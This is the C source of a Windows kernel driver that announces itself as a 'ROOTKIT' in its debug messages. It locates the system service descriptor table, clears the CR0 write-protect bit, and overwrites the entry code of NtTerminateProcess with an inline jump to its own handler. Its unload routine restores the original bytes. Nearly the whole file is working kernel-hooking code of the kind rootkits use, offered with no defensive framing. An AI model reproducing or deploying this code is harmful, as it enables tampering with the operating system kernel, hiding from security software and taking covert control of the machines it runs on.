#include <ntddk.h>
#include <wdm.h>
#include <string.h>
#include "P4tch3r.h"

ULONGLONG NtTerminateAddr;

PSYSTEM_SERVICE_TABLE KeServiceDescriptorTable;

void FixKernel(void);
extern void a_handle(void);

VOID Unlaod(PDRIVER_OBJECT DriverObj)
{
	FixKernel();
	DbgPrint("ROOTKIT UNLOAD\r\n");
}

KIRQL WriteProtectOFF(void)
{
	KIRQL irql = KeRaiseIrqlToDpcLevel();
	UINT64 cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();
	return irql;
}

void WriteProtectON(KIRQL irql)
{
	UINT64 cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
	KeLowerIrql(irql);
}

ULONGLONG GetKeServiceDescriptorTableAddr()
{
	PUCHAR s_search = (PUCHAR)__readmsr(0xC0000082);
	PUCHAR last_search_addr = s_search + 0x500;
	PUCHAR i = NULL;
	UCHAR b1 = 0, b2 = 0, b3 = 0;
	ULONGLONG templong = 0;
	ULONGLONG addr = 0;
	for (i = s_search; i < last_search_addr; i++)
	{
		if (MmIsAddressValid(i) && MmIsAddressValid(i + 1) && MmIsAddressValid(i + 2))
		{
			b1 = *(i);
			b2 = *(i + 1);
			b3 = *(i + 2);
			if (b1 == 0x4c && b2 == 0x8d && b3 == 0x15)
			{
				memcpy(&templong, i + 3, 4);
				addr = (ULONGLONG)templong + (ULONGLONG)i + 7;
				break;
			}
		}
	}
	return addr;
}

ULONGLONG GetSSDTFunction(ULONG index)
{
	LONG dwtmp = 0;
	ULONGLONG addr = 0;
	PULONG service_table_base = NULL;
	service_table_base = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
	dwtmp = service_table_base[index];
	dwtmp = dwtmp >> 4;
	addr = ((LONGLONG)dwtmp + (ULONGLONG)service_table_base);
	return addr;
}

void __fastcall Handle(int handle, int exit_code)
{
	DbgPrint(">>>> called: NtTerminateProcess(%11x, %11x)\r\n", handle, exit_code);
}

void FixKernel(void)
{
	UCHAR payload[] = { 0x49, 0x89, 0xE3, 0x49, 0x89, 0x5B, 0x18, 0x89, 0x54, 0x24, 0x10, 0x55, 0x56 };
	KIRQL irql = WriteProtectOFF();
	RtlCopyMemory((PVOID)NtTerminateAddr, payload, sizeof(payload));
	WriteProtectON(irql);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObj, PIRP IRP)
{
	DriverObj->DriverUnload = Unlaod;
	DbgPrint("Getting function address...\r\n");

	KeServiceDescriptorTable = (PSYSTEM_SERVICE_TABLE)GetKeServiceDescriptorTableAddr();
	GetKeServiceDescriptorTableAddr();
	NtTerminateAddr = GetSSDTFunction(41);

	ULONGLONG(*test)() = &a_handle;

	UCHAR payload[13] = { 0x49, 0xB8, /**/0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41/**/, 0x41, 0xff, 0xd0 };
	int addr_c = 0;
	for (int j = 2; j <= 9; j++)
	{
		payload[j] = BYTE((unsigned long long)test, addr_c);
		addr_c++;
	}

	KIRQL irql = WriteProtectOFF();
	RtlCopyMemory((PVOID)NtTerminateAddr, payload, sizeof(payload));
	WriteProtectON(irql);

	DbgPrint("ROOTKIT LOAD\r\n");

	return STATUS_SUCCESS;
}